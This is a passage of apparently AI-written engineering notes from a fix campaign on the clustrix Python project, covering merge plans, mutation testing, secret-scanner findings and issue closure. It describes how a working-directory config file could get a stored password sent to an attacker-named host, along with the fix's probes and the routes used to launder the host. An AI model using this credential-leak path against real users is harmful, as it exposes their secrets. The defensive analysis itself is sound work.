rather than the legacy widget growing a second mechanism. Reset stays confined
to widget-owned fields, so settings configured only in code survive.

```
before:  host control: ''  ->  'local' 'hpc.example.edu' 'researcher'
after:   host control: ''  ->  'local' None None
```

F1's unreachable branch was made reachable on the real path rather than
deleted: Apply now carries the loaded profile's keys that no control owns, but
managed-field *values* still come from the controls, so an emptied box wins.
The observable difference is the point — before: `TOLD: []` with the key
silently erased from `widget.configs`; after: the key is named and retained, so
a second Apply says it again.

Round two is aimed at the new risk this creates: `reset_fields` now actively
sets things to `None`, and over-resetting is as bad as under-resetting. It is
also checking whether a profile carrying `password` / `hf_token` could have a
secret surface in the widget's `⚠️ Ignored` output.

## Environmental, not a defect: `_tkinter`

Two independent agents reported 3 failing tests in `TestGetPasswordGui`. They
fail identically **at the base commit** on Homebrew Python, which has no
`_tkinter`; installing `python-tk@3.11` makes them pass. So the #123
red-team's "1736 passed / 4 failed" is **1 real** (its F3, the secret-scanner
break) **+ 3 environmental**. Do not chase these; do check that the CI image
has tk, or that the tests skip cleanly without it — a test that fails for want
of a system library is noise that trains people to ignore red.

## Merge conflict located and planned (re-run at tip `1005244`)

```
work/fixes         (50a93d9)  clean
work/silent-failures (214fbce) clean
work/widget-apply  (bc15217)  CONFLICT: clustrix/config.py
work/named-env     (d22a9fa)  clean
```

Only one conflict, and it is mechanical rather than semantic. Hunks in
`clustrix/config.py` per branch:

| Branch | Regions touched |
|-|-|
| `work/fixes` (#167) | imports at 181-231, then 362-449 — `SECRET_FIELDS`, `PERSISTABLE_KEYS`, `strip_secret_fields` |
| `work/silent-failures` (#123) | imports at 1-12, then 555-722 — the lazy loader, `_ensure_default_config_loaded`, `save_config` |
| `work/widget-apply` (#165) | import at line 7, plus a **59-line insertion at ~589** — `config_field_names`, `split_config_kwargs`, `WIDGET_MANAGED_FIELDS`, `MIGRATED_PROFILE_KEYS` |

The collision is #165's insertion point landing inside the range #123 rewrote,
plus both touching the import block. Both changes are **additive and
compatible**; resolution is interleaving, not choosing.

### Resolution order

1. `work/fixes` → 2. `work/silent-failures` → 3. `work/widget-apply` (resolve
`config.py` by hand) → 4. `work/named-env`.

### Then the consolidation, in the same sitting

After the merge `config.py` will hold **four** derivations of
`{f.name for f in fields(ClusterConfig)}` — #167's at 378/390/415, #165's
`config_field_names()` at ~597, and the `known` checks at ~657/664. Git will
not flag it because they sit on different lines. Make `config_field_names()`
the single derivation; have `PERSISTABLE_KEYS`, `split_config_kwargs` and the
`known` checks call it. The filtered sets (secret / not-secret) stay separate —
they apply different predicates — but should filter `config_field_names()`
rather than re-walk `fields()`.

Re-run this simulation immediately before merging: the #123 and #167 fix agents
are still committing to two of these branches.

## `_tkinter`: a fragility, not a defect — recorded, not filed

`tkinter` **is** importable in the repository's own interpreter, so CI is not
at risk today and the failures were confined to agents' Homebrew venvs.

The fragility is that `tests/test_auth_fallbacks.py` patches `tkinter.Tk` with
`@patch` at decoration time, which requires the module to be importable even
though the production code (`auth_fallbacks.py:45`, `auth_methods.py:304`,
`auth_manager.py:165`) imports it lazily *inside* functions with an
`ImportError` fallback. So the production code degrades gracefully on a Python
without tk and the test does not. A `pytest.importorskip("tkinter")` would make
the tests match the code they cover.

Below the bar for its own issue — but it cost two agents time, and the file is
already in scope for #117's mock replacement, so fix it there.

## #167 round-two fix — `f364c61`

The design is **provenance tracking**, which is the right shape. `ClusterConfig`
now records where its `cluster_host` came from — a plain attribute, not a
dataclass field, so it cannot be set from a file and is never persisted.

- **Trusted**: `ClusterConfig(...)` / `configure(cluster_host=)`,
  `load_config(path)`, `<config dir>/config.*`
- **Untrusted**: `./clustrix.*` — kept, because a project-local file is
  documented and useful, but now warns on adoption

`auth_methods.stored_credential_is_for_config` releases a credential if it
names *this* host exactly, or names **no** host and the host came from a
trusted source — which is what keeps the documented `.env`-password +
config-file-host workflow alive.

Proven with a real in-process `LocalSSHServer` accepting only a sentinel, so an
auth record is evidence the sentinel travelled:

```
before: AssertionError: the stored password was sent to a host named by a file
        in the working directory: [('victim', 'password')]
after:  authentications == []   (connection refused)
```

**15/15 mutants killed**, including M9 (static-literal `PERSISTABLE_KEYS`) and
M10 (unfreezing `^use_`), both of which survived round one. H5's freeze is gone
as dead code and the commit corrects the record: `USE_PASSWORD` was closed by
`UNCLASSIFIABLE_FIELDS`, not by the freeze.

H3's `UNCLASSIFIABLE_FIELDS` is now derived from field **types**, and recursion
was **rejected** with a reason worth keeping: recursing classifies nested keys
by *name*, which is the approach #167 replaced, and `{"license_blob": …}`
defeats it.

Round two is aimed at the provenance attribute itself — whether it survives
`copy`/`deepcopy`/`pickle`/`dataclasses.replace`, whether losing it fails open
or closed, and whether `CLUSTRIX_CONFIG_DIR` (trusted, and an environment
variable) is a real boundary or a hole.

## Toolchain verified independently — not taken on report

`f364c61` was committed with `--no-verify`, the agent citing a 3.9 hook
interpreter. I checked rather than accepting it:

- `.pre-commit-config.yaml` **already** pins `default_language_version:
  python: python3.12`, and documents this exact hazard — including that a
  redundant `language: system` black step used to fight the pinned one, "so no
  commit could satisfy both hooks".
- `python3.12` **is** present (`/opt/homebrew/bin/python3.12`, 3.12.10). So the
  hook should work and `--no-verify` was probably unnecessary.

I then verified every branch tip myself with the pinned toolchain, via
`git archive` into scratch directories so no occupied worktree was touched:

| tip | black 26.3.1 | flake8 7.0.0 |
|-|-|-|
| `f364c61` (#167) | 237 files unchanged | 0 |
| `214fbce` (#123) | 232 unchanged | 0 |
| `bc15217` (#165) | 231 unchanged | 0 |
| `d22a9fa` (#164) | 231 unchanged | 0 |
| `1005244` (#152) | 230 unchanged | 0 |

All clean. `mypy` deferred to the post-merge gate, where it runs once against
the merged tree rather than five times against branches that will not ship
separately.

## The real merge blocker: #167 and #123 both restructured `_load_default_config`

The earlier trial (three branches) was green. Adding `work/silent-failures`
produces **5 conflicts in `clustrix/config.py`**, and they are not mechanical.

| # | line | #167 (`work/fixes`) | #123 (`work/silent-failures`) |
|-|-|-|-|
| 1 | 5 | `import warnings`, `get_args/get_origin` | `import threading`, `List` |
| 2 | 678 | 77 lines — "Where a configuration came from" provenance block | 6 lines — singleton comment |
| 3 | 896 | "the caller named this path, so the caller chose it" | "an explicit load replaces the configuration wholesale" |
| 4 | 960 | 22 lines — `_load_default_config` with provenance | 3 lines — extracted `_default_config_candidates()` |
| 5 | 1004 | candidates as `(path, CONFIG_SOURCE_*)` **tuples** | candidates as bare `Path`s |

Conflicts 1 and 3 are trivial. **Conflicts 2, 4 and 5 are one problem**: both
branches rewrote the candidate list and its loader, for different reasons —
#167 to tag each candidate with its provenance, #123 to defer the search and
extract the candidate list into its own function.

The resolution is not "pick a side": it is a **candidate list that is both
lazily evaluated and provenance-tagged**. That is a small design task, and the
two comments at conflict 3 are two different correct explanations of the same
rule, so the merged code needs one rationale written fresh rather than either
one kept.

**Plan:** do this as a dedicated integration step once all four fix agents have
landed, not as a rushed conflict resolution. Fold in the `config_field_names()`
consolidation at the same time — same file, same sitting, and the merged
`config.py` is where the four duplicate `fields(ClusterConfig)` walks meet.

Trial worktree `/private/tmp/clx-trial` is retained, merge aborted, tree clean.

## My own error, caught by a red-team

The #152 round-two reviewer found that `notes/2026-08-20-issue-159-campaign.md`
— this file — contained a password-shaped literal, quoted verbatim while
recording #123's F3. It tripped `scripts/check_for_secrets.py` and would have
failed CI on `test_the_repository_is_clean`.

Rewritten to describe the literal instead of reproducing it;
`scripts/check_for_secrets.py` now reports clean. Worth recording because it is
the same defect the campaign has been fixing all day, committed while
documenting someone else's instance of it — a quoted secret is still a secret.

## #123 fix round — `5970455`

All seven findings fixed. Evidence is unusually strong:

- **F1** the lost `load_config` race: before, 3/3 then 9/15 trials lost the
  explicit load. After: **40 runs × 15 trials = 600 interleavings, 0 failures.**
- **F2** the fork deadlock: before `NO RESULT (DEADLOCK)` 3/3. After: 10
  repetitions of a fork+spawn test, 0 failures, via `os.register_at_fork`.
- **F5** the guard rule was **inverted** — from "the body is a bad shape" to
  "the handler must do something" — following this repo's own precedent that
  enumerating bad patterns loses. That closed all **13** bypasses, fixed the
  key collision (qualified keys) and the glob (`rglob`), and **exposed 9 real
  swallows** the narrow rule had never seen. Seven residual blind spots are
  each documented *with an assertion proving they are missed*, rather than left
  implicit.

`1782 passed, 17 skipped, 0 failed`; flake8, mypy and pinned black clean.

## Methodology finding: stale bytecode can fake a surviving mutant

From the #164 round-three work, and it generalises to every mutation result in
this campaign:

> same-size mutants within one second reused stale bytecode and gave one false
> GREEN

If a mutated `.py` has the same size and an mtime within the same second as the
original, CPython can reuse the cached `__pycache__` bytecode — so the test
runs against the **unmutated** code. The remedy used:
`PYTHONDONTWRITEBYTECODE=1` plus a `__pycache__` wipe per case.

**Which way does this bias?** Safely. A stale-bytecode run executes the
original code, so the suite passes, so the mutant is recorded as **SURVIVED**
when it would really have been killed. That over-reports gaps — we write a test
we did not need — and never under-reports them. No finding in this campaign is
invalidated by it; at worst some effort was spent on non-gaps.

Still worth adopting as standard: any future mutation run should set
`PYTHONDONTWRITEBYTECODE=1` and clear `__pycache__` between cases, or the
result is not trustworthy in the direction that matters least but is still not
trustworthy.

## #164 round three — `1422862`

The N1 regression is fixed **at the root cause** rather than papered over: the
`python_executable = venv_info["venv1_python"]` overwrite in
`executor_schedulers.py` is **deleted**. Nothing read it for VENV1, and it
leaked into the next submission through the singleton config. A new
`config_for_job_script(config, venv_info)` is now the single write-back seam and
writes only `venv_info`.

```
BEFORE conda : conda run -n prod 'conda run -n clustrix_venv1_abc123 python' -c "
BEFORE plain : conda run -n prod /rj/venv1_serialization/bin/python -c "
AFTER  both  : conda run -n prod python -c "        (python3.11 when configured)
```

All 14 revert cases RED, including the three previously-surviving mutants
(M1 search order, M6 unquoted name, M7 empty early-return).

**9 new goldens** covering exactly what the old set did not: named single-venv
for slurm and ssh, `python_executable`, named two-venv conda and plain, named
via config, and named with setup lines. Each is `bash -n`-checked and asserted
free of nested `conda run` and of `venv1_serialization`.

**Decisions recorded.** Non-ASCII names are now **accepted** (`análisis`,
`环境`, `env(1)`, `my~env`, `a&b`) — the rules are conda's own (`/`,
whitespace, `:`, `#`) plus the shell metacharacters that matter because the
name lands in generated script. Refused: `/scratch/envs/prod`, `p:rod`, `.`,
`..`, leading `-`, over 255, empty. Prefix (`-p`) environments are **refused
clearly at config time** rather than accepted and failed on the compute node —
supporting them means threading `-p` through three emitters and the docs, which
is its own change.

`1877 passed, 17 skipped` (baseline 1800, +77); flake8, mypy, pinned black and
the sphinx build all clean.

## The `config.py` integration, designed rather than improvised

I read both versions of the loader. The resolution is well-defined and one side
is strictly better on a point neither branch noticed.

### Take #123's structure

`_default_config_candidates() -> List[Path]` plus the lazy
`_ensure_default_config_loaded()` with its lock and **two** flags. Keep all of
it, including the reasoning recorded in its docstring — the published flag
(`_default_config_loaded`) is set only after the search finishes, and a separate
`_default_config_loading` is the re-entrancy guard, because setting the
published flag first is a measured race that hands half the threads a
configuration with no `cluster_host`.

### Take #167's provenance

Change the return type to `List[Tuple[Path, str]]`, tagging each candidate:

```python
config_dir / "config.yml"   ->  CONFIG_SOURCE_USER_CONFIG_DIR
cwd / "clustrix.yml"        ->  CONFIG_SOURCE_WORKING_DIRECTORY
```

and keep #167's recording of the winning source, which is what the credential
layer consults via `config_source_is_trusted`.

### #123's error handling is strictly better — keep it, discard #167's

This is the part worth not losing in a hurried merge. On the same failure path:

| | #167 | #123 |
|-|-|-|
| `get_config_dir()` raises `RuntimeError` | `pass` — silent | `logger.warning` naming what was skipped and how to fix it |
| `Path.cwd()` raises `OSError` | **not handled at all** | caught, warned, search continues |

#123's comment is the right instinct and should survive verbatim: *"silently
searching three of six locations is how a config file that is definitely there
appears not to be."* That is this whole campaign's thesis applied to the very
function being merged — and #167, a security fix, reintroduced the silent
version on the same lines.

### Write one rationale, not two

Conflict 3 is two *correct* explanations of the same rule in different words —
#167's "the caller named this path, so the caller chose it" and #123's "an
explicit load replaces the configuration wholesale". The merged code needs one
paragraph written fresh, not either kept.

### Fold in the consolidation

Same file, same sitting: make `config_field_names()` the single
`fields(ClusterConfig)` derivation and have `PERSISTABLE_KEYS`,
`split_config_kwargs` and the `known` checks call it. The secret/not-secret sets
legitimately stay separate — different predicates — but should filter
`config_field_names()` rather than re-walk `fields()`.

## #165 round three — `0a3e6fb`

Both surviving mutants pinned (D10 the `asdict(ClusterConfig())` default seed,
D11 the profile lookup keyed off the stored name rather than the name box), and
`password_env_var` / `use_env_password` removed from
`BACKEND_ONLY_FIELDS[("ssh","slurm")]`.

**The line drawn, and why it is right:** backend-only means *targets and
credential material* — what names the compute, who it runs as there, and the
secret that opens **that particular door**. `_choose_execution_mode` routes on
`cluster_host`, which is the reset's actual rationale. `password_env_var` holds
no secret and names no target; it names an environment variable, a property of
the local machine. With `save_to_file` omitting secret-bearing fields, wiping it
destroyed the one credential setting unrecoverable from disk.

It also added `test_a_local_apply_still_drops_the_target_and_its_credentials`
so the fix cannot decay into deleting `BACKEND_ONLY_FIELDS` outright — a fix
that loosens a rule needs a test pinning what the rule still does.

`1743 passed`, 222 insertions / 2 deletions, no test weakened.

## Three secret-scanner trips in one day, all by people working on secrets

| Who | Literal | Where |
|-|-|-|
| #123 fix agent | a password-shaped constant in a new test | `test_no_silent_swallows.py` |
| me | the same literal, quoted verbatim while *recording* the above | this notes file |
| #165 fix agent | a password-shaped literal in a new test | `test_widget_apply.py` |

Each was caught by `scripts/check_for_secrets.py` before reaching CI, and each
was fixed by choosing an already-tolerated fixture spelling rather than
extending the suppression list — which is the correct move and was explicitly
required in every brief.

**Make that four, and two of them mine.** Having written the table above, I
then tripped the scanner *with the table* — the `#165` row quoted its literal
verbatim, exactly as I had done a few hours earlier when recording `#123`'s.
Caught by the #152 round-three reviewer, not by me, and not by CI.

**Standing rule from here: never reproduce a credential-shaped literal in
notes, commit messages, or issue comments.** Describe it — "a password-shaped
literal in a new test" — and name the file. The literal adds nothing a reader
needs and puts the string into a tracked file, which is the whole defect. I
made the same mistake twice in one day while documenting other people making
it, which is the strongest possible argument that describing beats quoting.

The pattern is worth noting rather than shrugging at: all three happened while
the author was actively thinking about credential handling. A scanner that only
catches careless people would not have caught any of these.

## #167 round three — `c32fe56`. The right architectural answer.

Round two defeated per-object provenance by **rebuilding the object**
(`dataclasses.replace`, `configure(**asdict(cfg))`). Round three did not plug
those two routes; it moved the trust label **off the object and onto the
hostname**:

`_HOSTS_NAMED_BY_UNTRUSTED_SOURCES` maps every host an untrusted source named
in this process → that source, and `get_config_source` consults it. No rebuild
route can launder a host, including routes nobody has thought of. That is the
difference between patching the exploits you found and removing the class.

All four probes behave correctly, including the **positive** case that must
still succeed:

```
[replace-launders]         source=working-directory     server saw: []
[widget-apply-cwd-yml]     source=working-directory     server saw: []
[envvar-redirect-…]        source=redirected-config-dir server saw: []
[user-config-dir]          source=user-config-dir       LEAKED  <- documented workflow, correct
```

12/12 mutants killed. Pre-commit hooks ran and passed — no `--no-verify` this
time. `1868 passed, 3 failed (tkinter), 17 skipped`.

**Decisions worth keeping:**

- **L4** `CLUSTRIX_CONFIG_DIR` is untrusted when it *redirects*, but pointing it
  at `~/.clustrix` is not a redirect — realpath-compared on both sides, so a
  symlinked config dir is unaffected and H4 survives.
- **L6** `load_config(path)` stays trusted and the **docs changed instead**.
  The reasoning is right: distrusting relative paths is theatre, because
  `load_config(os.path.abspath("clustrix.yml"))` is the identical act.

**Routed changes to watch at merge:**

- `tests/conftest.py` now sets `CLUSTRIX_CONFIG_DIR` to `$HOME/.clustrix`
  *inside* the isolated home — an unrelated tmpdir had been putting every test
  into a "redirected-dir" configuration.
- `complete_api_demo.ipynb` cell 8 used `configure(**config.__dict__)`, which
  splats a **private** attribute into the public API, and now uses
  `asdict(config)`. A documented example was teaching a pattern that breaks the
  moment any private state exists.
- No widget-side change is required, so `work/widget-apply` is untouched.

## The return-shape question — open, and worth an answer

`decorator.py:758-772`:

```python
if len(results) == 1:
    return results[0]
if all(isinstance(r, list) for r in results):
    ...concatenate...
return results
```

At one chunk the per-chunk value comes back **unwrapped**; at two or more, a
non-list per-chunk value is wrapped in a **list**. If that holds in practice,
the shape of what the user gets back depends on the chunk count — which now
follows `cores` after #152. Before #152 it followed `os.cpu_count()`, so the
shape depended on the *machine*; deterministic-given-`cores` is better, but
shape-varying either way.

`limitations.rst` documents that a parallel run and a sequential run can differ
in shape. It does **not** document that two *parallel* runs differing only in
`cores` can. Whether that is a new defect or an unstated consequence of a known
one is the open question.

My own probe was inconclusive: the function I wrote had no parallelizable loop,
so the decorator declined and the combine path never ran. Reaching it needs a
literal `range()` loop **and** a callee accepting the `_parallel_<var>` chunk
keyword — both, or the code under test is never executed. Handed to the #152
reviewer with that instruction.

## Notebook markers verified against the new checker

The `# cluster-required` markers were added in the main checkout; the
notebook-aware checker lives on `work/fixes`. They had never been run together.
Tested by archiving `work/fixes` to a scratch tree and overlaying the two marked
notebooks:

```
before:  239 checks / 36 files / 7 notebooks: 232 passed, 7 failed
after:   234 checks / 36 files / 7 notebooks: 232 passed, 2 failed
```

All five `cluster-required` failures resolved — `slurm_tutorial` 5 and 19,
`ssh_tutorial` 6, 8 and 18. The check total drops 239 → 234 because marking a
cell moves it from "would be executed" to "statically verified" (61 static, up
from 66 counted differently), which is the intended accounting.

The two survivors are `local_parallel_comparison.ipynb` cells 7 and 9 — the
stale stored output — and they are **deliberately** left for the post-merge
re-run, since #123, #164 and #167 can each still change what that notebook
prints.

**CI gate is therefore satisfiable**: `check_docs_examples.py` will reach
234/234 once that notebook is re-run at the merged tip, and not before.

## #152 round-three review — the return-shape question, answered

All five round-three kills re-verified RED by the intended test. Four mutants
survived, and one of them settles the open question.

**M4 — the shape hazard is live, and unpinned.** Verified by running it:
`cores=1` yields `dict`/`int`/`tuple`; `cores=2` yields a `list` of 4. Deleting
the `len(results)==1 -> results[0]` branch **survived everything**. And it does
not need a mutant to bite: a **1-iteration range** produces one chunk and
therefore an unwrapped result, while a longer range produces a list.

Decision: **do not change the shape in this PR.** It is user-visible behaviour,
and altering it is a breaking change that needs its own issue and release note.
Instead pin it with an explicit public-API test, document it in
`limitations.rst` (which says parallel-vs-sequential can differ but not that two
*parallel* runs differing only in `cores` can), and file a follow-up framed
honestly: for a list-returning callee, concatenation makes parallel match
sequential; for a scalar-returning callee **neither** answer is right — one
chunk returns the complete answer, two return two partials the user must
reduce. The unwrap is therefore not simply a bug, and fixing it is a decision
about what `parallel=True` promises.

**M3 — the `NullHandler` hole is real.** `isEnabledFor` returns True, the
warning budget is spent, and **0 warnings are delivered** once a handler is
attached later — exactly the failure the delivery gate was added to prevent.
Gating at `ERROR` instead of `WARNING` also survived, so the test probed one
arbitrary level rather than the level.

No leak, though: 200 calls with logging off leave `reported == set()`, and
`logging.disable()` is handled. There is a pre-existing unbounded key space
(100 distinct `configure(default_cores=k)` calls retain 100 keys).

**M1 — `>=` is weaker than the contract.** A chunker returning `max_workers*4`
survives; counts are exactly `2*workers` today. **M2** — a combiner returning
`sorted()` survives, so ordering is only partly pinned
(`TestResultCombination` catches the non-list case but not this one).

**Smaller:** `traitlets` is imported directly by
`tests/test_notebook_magic_extended.py` and satisfied only transitively via
`ipython`; a direct import deserves a direct declaration. And the reviewer
reported `1733 passed` against the previous round's `1732` — an unexplained
±1 is exactly what hides a conditionally-skipped test, so it is being
reconciled rather than ignored.

**Confirmed sound:** the barrier test is not flaky (7/7, 1.21-1.32 s, under
load average 16 with three other suites running), and no test in the file
`return`s instead of asserting (23 tests, all assert, 2 via `pytest.raises`).

## Closure plan (execute after the merge lands on master)

28 issues open. Every verdict below is against the issue's **own** stated
criteria, not against how much work landed on it.

### Close with an evidence comment

| Issue | Evidence |
|-|-|
| #152 | cores bounds the pool and the bound is reachable; 4 fix rounds, 3 reviews |
| #153 | **posted** — 0 `cred_manager` refs, 155 tests collect, no env leak |
| #157 | **posted** — appends one line; corruption reproduced first |
| #158 | **posted** — `queue="gpu"` absent from the generated script |
| #164 | named conda env reaches the script; 9 goldens; **real-hardware box stays unticked** |
| #165 | Apply works on both widgets, end to end |
| #166 | **posted** — 30 files/0 notebooks → 234 checks/7 notebooks; found 7 real failures |
| #167 | exfiltration closed and re-proven; laundering closed structurally |
| #147 | runner exits non-zero; 4 cases plus a control |
| #150 | compose parses to exactly `{ssh-server, slurm-mock}` |
| #116 | `grep -rn "unittest.mock\|MagicMock\|isinstance(.*Mock" clustrix/` is empty |
| #159 | roll-up, once the above are closed |

### Leave open, with the reason recorded

| Issue | Why |
|-|-|
| #111 | items 2-6 done; item 1 pending the deferred `gc --prune=now`. Tokens confirmed **dead** (HTTP 401) |
| #117 | 21 of 166 test modules still use mock |
| #122 | 34 modules remain in `clustrix/` |
| #151 | five-phase plan; Phase 1 (`cluster_put`/`cluster_get`) not started. Sub-issue of #160 |
| #161, #162 | config/docs sweeps, unblocked but not done |
| #163 | docs master — "file, do not fix" lifted, findings remain |
| #168, #169 | filed today |
| #160 + #140-146, #155 | deferred by design |
| #125, #126, #127, #131, #105, #101, #100, #98, #66, #108 | out of this campaign's scope |

### Order

1. Land the four round-three/four fixes and their reviews.
2. Integrate `config.py` to the design recorded above.
3. Re-run `local_parallel_comparison.ipynb` at the merged tip.
4. Gates: pytest, flake8, mypy, pinned black, `check_docs_examples.py` 234/234.
5. Push, PR, merge to `master` (both required checks fire — this PR touches
   `clustrix/` and `tests/`, so #169 does not block it).
6. Close the list above with evidence; roll up on #159.
7. **Then** `git reflog expire --expire=now --all && git gc --prune=now` — only
   once no agent is committing.

## #165 round-three review — right fix, false reason

**The backend-only line holds; its stated justification does not.** `0a3e6fb`
claims `password_env_var` is "the one credential setting unrecoverable from
disk". Backwards: `_NOT_ACTUALLY_SECRET = ^use_|_env_var$` deliberately
excludes it from `SECRET_FIELDS`, so `save_to_file` writes it **in plaintext**.
And nothing in the set is unrecoverable — for all 10 members the on-screen box
still holds the value after the reset.

The real distinction, which the commit never states: **a per-host name versus a
per-machine name.** `cluster_host`, `username`, `key_file`, `password` and the
`hf_*` targets name *this cluster*; `password_env_var` and `use_env_password`
name a variable on *this machine*, unchanged by a backend switch. Same
conclusion, sound reasoning — so the rationale is being rewritten, not the code.

That is the **fifth** fix in this campaign to ship a plausible justification
written before it was checked (#167's `^use_` freeze, #165's unreachable
warning, #152's phantom `cores=8` coverage, #123's overstated `"unknown"`, and
now this). In every case the code was fine and the prose was wrong, and in
every case only mutation testing or a direct probe caught it.

**Three surviving mutants:**

- `.strip()` on the profile lookup survives, because `_on_config_name_change`
  returns early on an empty name — so clearing the box leaves box `''` while
  current is still `'Big Data'`.
- `data[name] = None` at `notebook_magic_widget.py:2180` survives: a local Apply
  yields `cluster_port=None` and `remote_work_dir=None` on fields typed `str`.
- **Dropping `hf_allow_gpu_flavors` survives — and that is not just a test
  gap.** The billable-GPU permission stays `True` across a switch to local. GPU
  flavors bill by the second, and the anti-degradation test asserts namespace,
  flavor and token but not this one. A permission to spend money should fail
  safe.

**Pre-existing, and it makes the widget unopenable:**

```
configure(hf_flavor="a10g-large"); ModernClustrixWidget()
-> TraitError: Invalid selection   (modern_notebook_widget.py:2299)
```

The dropdown offers 10 flavors and `ClusterConfig` validates none. Same shape as
a defect already fixed in that file, where the answer was to *add* the
unrecognised value to the options rather than let a baked-in UI list veto a
saved configuration.

**Confirmed sound:** the stale-credential attack does not work — A(slurm,
PROD_PW) → local → B(slurm) clears the box and
`EnvironmentPasswordMethod.is_applicable` returns False. The anti-degradation
guard fires on an emptied set (RED 5).

### Methodology correction: the bytecode flag does not hold

`PYTHONDONTWRITEBYTECODE=1` is **not** sufficient.
`tests/unit/test_local_module_serialization.py` and `test_ssh_server_fidelity.py`
pass a scrubbed `env={...}` to subprocesses, which rewrite
`clustrix/__pycache__` mid-run (27 files). **The wipe is the protection, not the
flag**, and a SURVIVED verdict should be corroborated behaviourally
(`sys.path.insert` plus an assert on `clustrix.__file__`) rather than by a green
suite alone.

## `configuration.rst` conflicts the same way `config.py` does

Three branches edit it; the hunks show the collision is in the same place and
for the same reason as the code.

| Branch | Hunks |
|-|-|
| `work/fixes` (#167) | 42-43 (**+43 lines**), 93, 104, 585 |
| `work/silent-failures` (#123) | 26, 37-41 (**+19 lines**), 41, 80, 93, 112 |
| `work/named-env` (#164) | 315 (**+54 lines**) — isolated, will merge clean |

#167 and #123 both rewrite the **"Where configuration comes from"** section and
both touch line 93 — one to say the search is now **lazy**, the other to say the
locations are **not equally trusted**.

**The merged page must tell one story, not two appended ones:**

> Configuration is read on first use, not at import. These locations are
> searched in order, and they are not equally trustworthy: a file in the
> clustrix configuration directory is there because you put it there, while
> `./clustrix.yml` is there because of where the process happens to be running.
> A credential is never released to a `cluster_host` that only an untrusted
> source named.

Resolve this in the **same sitting** as `config.py`, and by the same person —
splitting them guarantees the prose and the code drift, which is how
`configuration.rst` came to contain five false claims in the first place.

`docs/source/api/config.rst` (#164 only) and `README.md`, `quickstart.rst`,
`limitations.rst` (#167 only) have no second editor and need no coordination.

## Money-authorising settings: surveyed, and the exposure is narrow

Checked whether `hf_allow_gpu_flavors` is one of a family that should fail safe.
It is the only one:

```
hf_allow_gpu_flavors: bool = False        # config.py:49  -- defaults safe
hf_jobs.py:330                             # enforced, with an explicit message
```

`cost_monitoring` is a **removed** setting (listed among the inert/removed
names), and `CLUSTRIX_ALLOW_BILLABLE` guards the integration tests, not runtime.

So the only exposure is the one round three found: the widget not resetting the
permission across a backend switch. No broader sweep needed.

## Correction: the unwrap is NOT reachable from the decorator

I wrote above that the shape hazard "is live today for a 1-iteration range".
**That is wrong**, and the #152 round-four agent corrected it with an exhaustive
check rather than an argument:

- splitting requires **≥3 iterations** (`LoopInfo._assess_parallelizability`)
- `chunk_size = max(1, len // (workers * 2))` cuts those into **≥2** pieces
- ranges 0-199 × workers 1-64: **no combination yields one chunk**

So `len(results) == 1 -> results[0]` is unreachable from `@cluster`. M4 is
therefore killed at the *helper*, not through the decorator:
`test_combine_local_results_single` now uses non-list payloads — the previous
list payload was invisible to it. Deleting the branch gives
`assert [{'total': 6}] == {'total': 6}`.

**What is real** is that the answer's shape depends on `cores`, and that is now
pinned at the public API with exact values rather than types:

```
partial_sum(8) at cores 1 / 2 / 4  ->  [6, 22] / [1, 5, 9, 13] / [0..7]
                                       — never 28
partial_sum(2)                     ->  int
```

Both facts are documented in `limitations.rst`, which also had a **now-false**
claim corrected ("length depends on `os.cpu_count()`" — it follows `cores`
since #152). The semantic question is filed as **#170**; the shape is
deliberately unchanged in this PR.

Lesson for me: I inferred the 1-iteration case from reading the code and stated
it as fact. The agent measured it. Reading gave the right *shape* of concern and
the wrong mechanism.

## The baseline ±1 is explained, and the explanation is useful

Collected counts are stable per commit — 1734 (`4126a03`) → 1745 (`1005244`) →
1750 (`87c8393`) → 1753 now. The wobble is entirely in **skips**: 1733 = 1750 −
17 skipped; 1732 is the same commit with 18. Five environment-conditional
`pytest.skip()` guards can flip with nothing changing.

**So `passed` alone is not a stable figure.** Quote collected + skipped
alongside it, or a ±1 looks like a vanished test when it is a machine
difference. Worth applying to every number in this campaign's record.

## #164 round-three review — "the committed code is correct; its guard is one function short"

The fix holds under heavy attack, but three mutants survived, all in
`SchedulerManager`, and one is serious.

**M13 — the regression can return in four lines, silently.** The N1 fix deleted
`config.python_executable = venv_info["venv1_python"]` and routed through
`config_for_job_script`. Moving that same line **four lines up**, into
`_setup_job_environment`, re-creates the round-two defect:

```
conda run -n prod 'conda run -n clustrix_venv1_job1 python' -c "
```

and it leaks into submission 2 again — with **all 1894 tests green**. The tests
pin the *seam*, not the *invariant*. `submit_slurm_job`, `submit_ssh_job` and
the two-venv success branch have **no test at all**.

The fix brief asks for the invariant pinned instead: whatever a job script ends
up containing, VENV2's interpreter must never be VENV1's. One test driving a
real submission and asserting no nested `conda run` and no
`venv1_serialization` should kill M13, M3 and M7 together.

**Finding 2 — a correctness hole, not a test gap.** The named path now has **no
interpreter-version check at all**; N3's build-skip removed the last one that
fired there. dill embeds CPython bytecode and cannot cross minor versions — the
project already refuses at submit time when the remote minor version differs,
precisely to avoid `unknown opcode` at run time. A user naming a conda
environment built on a different minor version now gets no warning and a
confusing remote failure.

**Finding 4 — another unchecked claim.** "Refused at config time" is false:
`configure(conda_env_name="/scratch/envs/prod")` is *accepted*, and the refusal
happens at submission, **after** the job directory and pickle are staged. Sixth
instance of a justification written before it was verified.

**Upheld under exhaustive check:** deleting the overwrite is safe —
`venv_info["venv1_python"]` has exactly one reader in the package, an f-string
in a `logger.info`. 26 backend/venv/python/route combinations all emit
`conda run -n prod <configured python>`. All 9 goldens regenerate byte-identical
and **do** notice (five mutants each break 9/9). The emitted shell survives
every hostile shell option tried.

### A flaky test, now measured

`test_known_hosts_atomicity::test_a_killed_writer_never_leaves_a_broken_file` is
**load-flaky**: 0-4 of its 6 parameters fail on repeat under load. So "1877
passed" was never a deterministic baseline. Assigned for diagnosis — and if the
flake turns out to reveal a real race rather than a test artefact, that is a
finding in its own right.

### Methodology, again

The reviewer's first in-worktree mutant batch was **SIGKILLed by memory
pressure and produced two false SURVIVEDs**, which it discarded and re-ran in
isolated `git archive` copies. Recorded because it is the second way a mutation
run can lie today (after stale bytecode), and both lie in the same direction:
**a killed or stale run reads as SURVIVED**. Never record a survivor from a run
that did not complete.

## Trial integration of `config.py`: the design is confirmed, and one hazard is now concrete

Merged `work/fixes` (#167 `c32fe56`) then `work/silent-failures` (#123
`5970455`) onto `282fd63` for real. Result: **2 conflicted files** —
`clustrix/config.py` (5 conflicts) and `docs/source/configuration.rst`, both
between #167 and #123, exactly as predicted.

### The hazard, seen directly

#167's `_load_default_config` loop contains:

```python
for path, source in candidates:
    if path.exists():
        try:
            load_config(str(path))
